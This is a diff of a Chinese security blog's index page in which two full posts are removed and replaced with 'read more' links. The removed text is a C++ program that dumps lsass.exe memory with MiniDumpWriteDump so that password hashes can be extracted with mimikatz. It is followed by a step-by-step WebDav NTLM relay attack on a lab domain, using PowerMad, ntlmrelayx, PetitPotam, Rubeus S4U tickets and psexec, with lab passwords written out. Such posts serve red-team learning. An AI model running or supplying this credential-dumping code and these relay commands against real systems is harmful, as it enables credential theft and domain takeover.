@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-20 10:47:24" itemprop="dateModified" datetime="2022-11-20T10:47:24+08:00">2022-11-20</time>
+                <time title="修改时间：2022-11-20 11:20:28" itemprop="dateModified" datetime="2022-11-20T11:20:28+08:00">2022-11-20</time>
               </span>
 
           
@@ -210,54 +210,37 @@
 <p>​    <code>Access Token</code>分为授权令牌(Delegation Token)、模拟令牌(Impersonation token)两种。</p>
 <p>Access Token包含以下信息</p>
 <ul>
-<li>用户帐户的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-identifiers">安全标识符</a>(SID)</li>
-<li>用户所属组的 SID</li>
-<li>标识当前<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></li>
-<li>用户或用户组拥有的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges">权限</a>列表</li>
-<li>所有者 SID</li>
-<li>主要组的 SID</li>
-<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>用户在未指定安全描述符</em></a>的情况下创建安全对象时系统使用的默认<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">DACL</a></li>
-<li>访问令牌的来源</li>
-<li>令牌是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>主要</em></a>令牌还是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation">模拟</a>令牌</li>
-<li>可选的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">限制 SID列表</a></li>
-<li>当前模拟级别</li>
-<li>其他统计</li>
-</ul>
-<p>​    <strong>Delegation Token：</strong> 用以交互式会话登陆（本地用户登陆、远程桌面等）</p>
-<p>​    <strong>Impersonation Token：</strong> 用以非交互式登陆(net user、远程共享访问)</p>
-<p>​    不同的用户登陆计算机后，都会生成一个Access Token,该token会在用户创建进程/线程时都会复制一份<code>Access token</code>用于描述与该进程相关联的用户账户的安全上下文，默认情况下，当进程的线程与安全对象交互时，系统使用<code>授权令牌</code>。此外，线程可以模拟客户帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有<code>授权令牌</code>和<code>模拟令牌</code>。当用户注销后系统会将<code>授权令牌</code>转换为<code>模拟令牌</code>，并在重启系统后清除。</p>
-<h5 id="安全对象"><a href="#安全对象" class="headerlink" title="安全对象"></a>安全对象</h5><p>安全对象是可以拥有<code>安全描述符</code>的对象，所有命名的Windows对象都是安全对象。一些未命名的对象，例如<code>进程</code>和<code>线程</code>对象也可以拥有安全描述符。。对于大多数的安全对象来说，我们可以在创建对象的函数调用中指定对象的<code>安全描述符</code>。</p>
-<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119200455694.png" alt="image-20221119200455694"></p>
-<h5 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h5><p>包含与安全对象关联的安全信息。安全描述符由<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/api/Winnt/ns-winnt-security_descriptor"><strong>SECURITY_DESCRIPTOR</strong></a>结构及其关联的安全信息组成。安全描述符可以包括以下安全信息：</p>
-<ul>
-<li>对象所有者和主要组的安全标识符（SID)。</li>
-<li>指定允许或拒绝特定用户或组的访问权限的DACL</li>
-<li>指定为对象生成审计记录的访问尝试类型的SACL。</li>
-<li>一组控制位，用以限定安全描述符或其各个成员的含义。</li>
-</ul>
-<h5 id="访问控制列表-Access-control-lists"><a href="#访问控制列表-Access-control-lists" class="headerlink" title="访问控制列表(Access control lists)"></a>访问控制列表(Access control lists)</h5><p>​    访问控制列表(ACL)是访问控制条目(ACE)的列表。ACL中每个ACE都标示一个受托者，并为该受托者指定访问权限。安全对象的安全描述符可以包含两种类型的ACL:<code>DACL</code>以及<code>SACL</code>。</p>
-<ul>
-<li>自由访问控制列表(DACL) 标示允许或者拒绝访问安全对象的受托人。当<code>进程</code>试图访问安全对象时，系统会检查对象的 DACL 中的 ACE，以确定是否授予对它的访问权限。如果对象没有 DACL，系统会授予每个人<code>Full Access</code>权限。如果对象的 DACL 没有 ACE，系统将拒绝所有访问该对象的尝试，因为 DACL 中没有可以通过匹配的ACE条目。系统按顺序检查 ACE，直到它找到一个或多个允许所有请求的访问权限的 ACE，或者直到任何一个请求的访问权限被拒绝。</li>
-<li>系统访问控制列表(SACL) 使管理员能够记录访问受保护对象的尝试。每个 ACE 指定特定受托者进行的访问尝试的类型，这些访问尝试会导致系统在安全事件日志中生成记录。SACL 中的 ACE 可以在访问尝试失败和/或成功时生成审计记录。</li>
-</ul>
-<h5 id="受托人"><a href="#受托人" class="headerlink" title="受托人"></a>受托人</h5><p>​    受托人是应用访问控制条目(ACE)的用户账户、组账户或者登陆会话。访问控制列表(ACL)中的每个ACE都有一个标示受托人的安全描述符（SID）。</p>
-<p>​    根据前置知识，我们可以得到用户登陆系统后创建进程、线程，程序访问安全对象时的权限会是怎么样的了。</p>
-<p>​    当用户登陆计算机，凭证验证通过后便会拿到一份访问令牌(Access Token)，该Token在我们创建进程或线程时会被使用，拷贝explorer.exe中的该用户的访问令牌到新的进程/线程当中用以权限分配。</p>
-<p>​    当程序访问安全对象时，安全对象会检测自身的<code>DACL</code>，若DACL不存在，则对所有程序开放访问权限；若DACL存在，会按顺序查找DACL内的ACL与程序的访问令牌比较判断，判断其是否具有访问权限。</p>
-<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119204452825.png" alt="image-20221119204452825"></p>
-<h5 id="MiniDumpWriteDump函数"><a href="#MiniDumpWriteDump函数" class="headerlink" title="MiniDumpWriteDump函数"></a>MiniDumpWriteDump函数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD                             ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] MINIDUMP_TYPE                     DumpType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/en-us/windows/win<span class="number">32</span>/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</span><br></pre></td></tr></table></figure>
-
-<p>函数结构如上所示，可利用此函数将进程转储，本文将Lsass.exe转储用以提取Hash。</p>
-<h4 id="0x2实现代码"><a href="#0x2实现代码" class="headerlink" title="0x2实现代码"></a>0x2实现代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;DbgHelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE LsassHandle = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE OutFile = <span class="built_in">CreateFile</span>(<span class="string">L&quot;LSASS.DMP&quot;</span>,GENERIC_WRITE|GENERIC_READ,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	DWORD PID;</span><br><span class="line">	HANDLE Snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 Entry;</span><br><span class="line">	Entry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">	LPWSTR ProcessName;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找lsass进程pid</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Process32First</span>(Snapshot, &amp;Entry)) &#123;</span><br><span class="line">		ProcessName = Entry.szExeFile;</span><br><span class="line">		PID = Entry.th32ProcessID;</span><br><span class="line">		<span class="keyword">while</span> (_wcsicmp(<span class="string">L&quot;lsass.exe&quot;</span>,ProcessName)!=<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">Process32Next</span>(Snapshot, &amp;Entry);</span><br><span class="line">			ProcessName = Entry.szExeFile;</span><br><span class="line">			PID = Entry.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lsass,exe pid is :&quot;</span> &lt;&lt; PID &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;snapshot error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//拿到lsass进程句柄</span></span><br><span class="line">	LsassHandle = <span class="built_in">OpenProcess</span>(</span><br><span class="line">		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,</span><br><span class="line">		<span class="literal">false</span>,</span><br><span class="line">		PID</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用MiniDumpWriteDump 转储lsass</span></span><br><span class="line">	BOOL status = <span class="built_in">MiniDumpWriteDump</span>(LsassHandle, PID, OutFile,MiniDumpWithFullMemory,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (status)</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;process dumping succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>效果展示，另外，若在解密文件时出现<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Key import</code>，可尝试低版本mimikatz离线解密。 如2.1.1版本。</p>
-<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215425139.png" alt="image-20221119215425139"></p>
-<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215253912.png" alt="image-20221119215253912"></p>
-<h4 id="0x3参考文章"><a href="#0x3参考文章" class="headerlink" title="0x3参考文章"></a>0x3参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</a></p>
-
+<li><p>用户帐户的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-identifiers">安全标识符</a>(SID)</p>
+</li>
+<li><p>用户所属组的 SID</p>
+</li>
+<li><p>标识当前<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></p>
+</li>
+<li><p>用户或用户组拥有的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges">权限</a>列表</p>
+</li>
+<li><p>所有者 SID</p>
+</li>
+<li><p>主要组的 SID</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>用户在未指定安全描述符</em></a>的情况下创建安全对象时系统使用的默认<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">DACL</a></p>
+</li>
+<li><p>访问令牌的来源</p>
+</li>
+<li><p>令牌是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>主要</em></a>令牌还是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation">模拟</a>令牌</p>
+</li>
+<li><p>可选的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">限制 SID列表</a></p>
+</li>
+<li><p>当前模拟级别</p>
+</li>
+<li><p>其他统计</p></li></ul>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -299,10 +282,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-10-30 10:51:43 / 修改时间：15:40:21" itemprop="dateCreated datePublished" datetime="2022-10-30T10:51:43+08:00">2022-10-30</time>
+              <time title="创建时间：2022-10-30 10:51:43" itemprop="dateCreated datePublished" datetime="2022-10-30T10:51:43+08:00">2022-10-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-20 11:20:41" itemprop="dateModified" datetime="2022-11-20T11:20:41+08:00">2022-11-20</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -326,67 +315,14 @@
       
           <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap/s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？</p>
 <p>​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端不支持签名验证的话，服务端在与客户端通信时是不会强制要求签名认证的。因此我们可以使用HTTP服务中的WebDav来尝试Relay攻击了。</p>
-<h3 id="什么是WebDav"><a href="#什么是WebDav" class="headerlink" title="什么是WebDav:"></a>什么是WebDav:</h3><p>​    WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV  就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。</p>
-<p>​    Windows通过WebClient服务实现WebDav，允许Windows程序通过WebDav来创建、读取以及写入服务器上的文件，并通过HTTP服务进行通信，在客户端访问WebDav时，若开启Windows身份验证机制，我们便可以通过域内凭证进行访问服务。</p>
-<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤:"></a>攻击步骤:</h3><ul>
-<li>拿到一枚域用户</li>
-<li>探测开启WebDav的服务器</li>
-<li>在域内为攻击机添加DNS解析</li>
-<li>使用Responder进行中继与委派</li>
-<li>强制WebDav服务器认证攻击机</li>
-<li>执行基于资源的约束委派攻击</li>
-</ul>
-<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h3><h4 id="探测WebDav服务"><a href="#探测WebDav服务" class="headerlink" title="探测WebDav服务"></a>探测WebDav服务</h4><p>​    拿到域内权限后，通过<code>GetWebDAVStatus.exe</code>探测内网中开放WebDav的服务器。</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png" alt="image-20221030124101717"></p>
-<p>​    发现目标后，为了让Relay顺利进行，我们可以添加一份DNS A记录，从而使得WebDav通过默认凭据来对我们进行身份验证，由于在Windows当中，WebDav由WebClient服务实现，而WebClient服务仅对内网以及受信任站点中的目标来采用默认凭据进行身份验证。</p>
-<h4 id="添加DNS解析"><a href="#添加DNS解析" class="headerlink" title="添加DNS解析"></a>添加DNS解析</h4><h5 id="0x1-域内使用PowerMad添加"><a href="#0x1-域内使用PowerMad添加" class="headerlink" title="0x1.域内使用PowerMad添加"></a>0x1.域内使用PowerMad添加</h5><p>此处我们使用PowerMad进行添加DNS A解析记录，此处我们添加解析记录，普通域用户也可添加，并非只有域管用户才可操作。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\<span class="built_in">invoke-DNSupdate</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-DNSUpdate</span> <span class="literal">-DNSType</span> A <span class="literal">-DNSName</span> evil.pentest.local <span class="literal">-DNSData</span> <span class="number">10.0</span>.<span class="number">10.128</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png" alt="image-20221030124859446"></p>
-<p>紧接着使用<code>ipconfig /flushdns</code>刷新dns本地缓存后可以看到使用ping命令即可成功解析我们所添加的记录</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030125010956.png" alt="image-20221030125010956"></p>
-<h5 id="0x2-域外使用dnstool-py添加"><a href="#0x2-域外使用dnstool-py添加" class="headerlink" title="0x2.域外使用dnstool.py添加"></a>0x2.域外使用dnstool.py添加</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u pentest.local\\Sharp -p Admin<span class="comment">#123 -r evil.pentest.local -d 10.0.10.128 --action add ws01.pentest.local</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151117006.png" alt="image-20221030151117006"></p>
-<h4 id="准备NTLM-Relay"><a href="#准备NTLM-Relay" class="headerlink" title="准备NTLM Relay"></a>准备NTLM Relay</h4><p>回到攻击机进行操作。</p>
-<p>利用Impacket项目<code>ntlmrelayx.py</code>执行攻击，指定LDAP协议进行身份验证，目标主机设置为域控，利用-delegate-access选项执行基于资源的约束委派攻击。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldaps://ws01 --delegate-access -smb2support</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030130628768.png" alt="image-20221030130628768"></p>
-<h4 id="强制认证主机创建机器账户"><a href="#强制认证主机创建机器账户" class="headerlink" title="强制认证主机创建机器账户"></a>强制认证主机创建机器账户</h4><p>回到被我们控制的主机，使用PetitPotam 强制WebDav服务器认证我们的攻击机，此处不可使用ip进行强制认证，使用我们先前添加的DNS解析进行强制认证,此处的<code>@</code>符号前为主机名，后为端口号。</p>
-<h5 id="0x1-域内认证"><a href="#0x1-域内认证" class="headerlink" title="0x1.域内认证"></a>0x1.域内认证</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe evil@<span class="number">80</span>/evil.cnf <span class="number">10.0</span>.<span class="number">10.110</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030131357379.png" alt="image-20221030131357379"></p>
-<h5 id="0x2-域外认证"><a href="#0x2-域外认证" class="headerlink" title="0x2.域外认证"></a>0x2.域外认证</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -u sharp -p Admin<span class="comment">#123 -d pentest.local evil@80/ad 10.0.10.110</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151852766.png" alt="image-20221030151852766"></p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151906831.png" alt="image-20221030151906831"></p>
-<p>这时候，回到攻击机查看可以发现，我们此时已经通过<code>ws03$</code>的身份，创建了一个机器账户</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132543523.png" alt="image-20221030132543523"></p>
-<p>这时我们回到域控查看WebDav服务器，可以发现<code>msDS-KeyCredentialLink</code> 属性已经被修改。</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132832081.png" alt="image-20221030132832081"></p>
-<h4 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h4><h5 id="0x1-域内申请票据"><a href="#0x1-域内申请票据" class="headerlink" title="0x1.域内申请票据"></a>0x1.域内申请票据</h5><p>此时，我们便可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p>
-<p>将密码转为hash，便于我们进行使用Rubeus进行申请票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /domain:pentest.local /user:RUVEPAFW$ /password:&#x27;gm9wPzATZ&lt;RT5Ei&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143159039.png" alt="image-20221030143159039"></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /user:RUVEPAFW<span class="variable">$</span> /rc4:<span class="number">4</span>A5AD55249E75BB39F928EFB55A8A81B  /impersonateuser:Administrator /msdsspn:host/ws03.pentest.local /altservice:cifs /nowrap /ptt</span><br></pre></td></tr></table></figure>
-
-<p>由于开启了PTT模块，此时我们缓存中已经加载了申请来的ST票据，拥有了访问WS03机器共享目录权限。</p>
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143131796.png" alt="image-20221030143131796"></p>
-<p>当然，我们也可以将申请到的kirbi票据除空格后解码base64，利用ticketConverter转为cacche格式，于域外利用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;payload&#x27;</span> | base64 -d &gt; administrator.kirbi</span><br><span class="line">python3 ticketConverter.py administrator.kirbi administrator.ccache </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144027489.png" alt="image-20221030144027489"></p>
-<p>将申请到的票据加载到环境变量中，使用psexec登陆远程服务器。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/opt/tools/impacket/examples/administrator.ccache</span><br><span class="line">python3 psexec.py -no-pass -k ws03.pentest.local</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144213123.png" alt="image-20221030144213123"></p>
-<h5 id="0x2-域外申请票据"><a href="#0x2-域外申请票据" class="headerlink" title="0x2.域外申请票据"></a>0x2.域外申请票据</h5><p>参考委派，使用机器账户身份申请ST票据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.0.10.111 pentest/RUVEPAFW\$ -spn cifs/ws03.pentest.local -impersonate administrator</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png" alt="image-20221030153948639"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
